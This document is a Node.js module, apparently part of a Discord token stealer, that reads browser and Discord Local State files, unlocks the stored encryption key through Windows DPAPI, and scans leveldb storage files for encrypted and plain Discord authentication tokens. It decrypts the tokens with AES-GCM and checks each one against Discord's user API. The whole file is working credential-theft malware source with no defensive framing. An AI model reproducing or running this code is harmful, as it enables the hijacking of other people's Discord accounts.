const axios = require("axios");
const crypto = require("crypto");
const dpapi = require("win-dpapi");
const superpapi = require("../../superpapi");
const fs = require("fs");
const path = require("path");

const DiscordApiUsers = "https://discord.com/api/v9/users/@me";

async function checkToken(token) {
  const method = {
    method: "GET",
    headers: {
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74",
      "Content-Type": "application/json",
      Authorization: token,
    },
  };

  try {
    const response = await axios.get(DiscordApiUsers, method);

    if (response.status === 200) {
      return token;
    }
  } catch (error) {}
}

function getKey(pathTail) {
  try {
    const localStatePath = pathTail + "/Local State";
    const localStateContent = JSON.parse(fs.readFileSync(localStatePath));
    const encryptedKeyData = Buffer.from(
      localStateContent.os_crypt.encrypted_key,
      "base64"
    ).slice(5);

    const key = superpapi.unprotectData(
      Buffer.from(encryptedKeyData, "base64"),
      null,
      "CurrentUser"
    );

    return key;
  } catch (error) {
    console.error("Error getting key:", error);
    return null;
  }
}

function decryptToken(token, key) {
  let start = token.slice(3, 15),
    middle = token.slice(15, token.length - 16),
    end = token.slice(token.length - 16, token.length),
    decipher = crypto.createDecipheriv("aes-256-gcm", key, start);

  decipher.setAuthTag(end);
  let out;

  try {
    out = decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8");
  } catch (error) {
    return null;
  }

  return out;
}

function searchTokens(line, tokens, key) {
  try {
    const pattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g);
    const foundTokens = line.match(pattern);
    if (foundTokens) {
      foundTokens.forEach((token) => {
        token = Buffer.from(token.split("dQw4w9WgXcQ:")[1], "base64");
        const decryptedToken = decryptToken(token, key);
        if (!tokens.includes(decryptedToken)) tokens.push(decryptedToken);
      });
    }

    const regex = [
      new RegExp(/mfa\.[\w-]{84}/g),
      new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g),
    ];
    for (const _regex of regex) {
      const token = line.match(_regex);
      if (token) {
        token.forEach((element) => {
          tokens.push(element);
        });
      }
    }
  } catch (error) {
    console.error("Error searching tokens:", error);
  }
}

function getTokens(tokenPath) {
  const pathTail = tokenPath;
  tokenPath += "\\Local Storage\\leveldb";
  let tokens = [];

  if (fs.existsSync(pathTail + "\\Local State")) {
    const key = getKey(pathTail);

    fs.readdirSync(tokenPath)
      .filter((file) => file.endsWith(".log") || file.endsWith(".ldb"))
      .forEach((file) => {
        fs.readFileSync(path.join(tokenPath, file), "utf8")
          .split(/\r?\n/)
          .forEach((line) => {
            searchTokens(line, tokens, key);
          });
      });
  } else {
    fs.readdirSync(tokenPath)
      .filter((file) => file.endsWith(".log") || file.endsWith(".ldb"))
      .forEach((file) => {
        fs.readFileSync(path.join(tokenPath, file), "utf8")
          .split(/\r?\n/)
          .forEach((line) => {
            searchTokens(line, tokens, null);
          });
      });
  }

  return tokens;
}

module.exports = {
  checkToken,
  getKey,
  decryptToken,
  searchTokens,
  getTokens,
};
